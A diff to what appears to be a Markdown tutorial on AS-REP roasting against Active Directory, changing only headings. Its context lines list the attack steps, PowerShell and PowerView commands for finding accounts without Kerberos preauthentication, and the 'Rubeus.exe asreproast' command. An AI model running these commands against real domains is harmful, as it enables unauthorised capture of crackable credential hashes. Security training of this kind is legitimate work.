@@ -17,7 +17,7 @@ toc: true
 
 <img src="/img/asrep/1.PNG" alt="Getting-gz" width="600" height="200"> 
 
-## AS-REP roasting attack consists of the following steps:
+## AS-REP roasting attack consists of the following steps
  * 1-Obtain access to a domain as an authenticated user.
  * 2-Use an LDAP filter or tools like PowerView’s Get-DomainUser feature to crawl the domain and identify user accounts with the Do not require Kerberos preauthentication  Property  enabled.
  * 3-Identify target account or accounts.
@@ -35,7 +35,7 @@ SPN: Service Principal Name  #The name of a service on the network
 ```
 
 
-##  enumerate User account with "Do not require pre-authentication"
+##  enumerate User account with Do not require pre-authentication
 ```
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
@@ -50,7 +50,7 @@ Get-DomainUser -PreauthNotRequired -verbose| select name
 
 <img src="/img/asrep/enum1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-## ASREP Roasting with Impacket
+## ASREP Roasting with Rubeus
 
 ```
 Rubeus.exe asreproast
